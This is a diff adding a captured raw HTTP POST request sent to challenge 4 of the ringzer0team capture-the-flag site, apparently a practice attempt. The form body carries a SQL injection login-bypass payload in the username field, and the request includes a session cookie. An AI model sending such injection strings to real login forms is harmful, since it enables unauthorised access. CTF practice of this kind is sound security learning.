@@ -1,0 +1,16 @@
+POST /challenges/4 HTTP/1.1
+Host: ringzer0team.com
+Connection: close
+Content-Length: 46
+Cache-Control: max-age=0
+Origin: https://ringzer0team.com
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Referer: https://ringzer0team.com/challenges/4
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: _ga=GA1.2.1199078759.1526448138; _gid=GA1.2.1684881925.1526448138; PHPSESSID=8bora736cg7rmv4mlldsdr22n6; _gat=1
+
+username=admin' or () --+&password=1
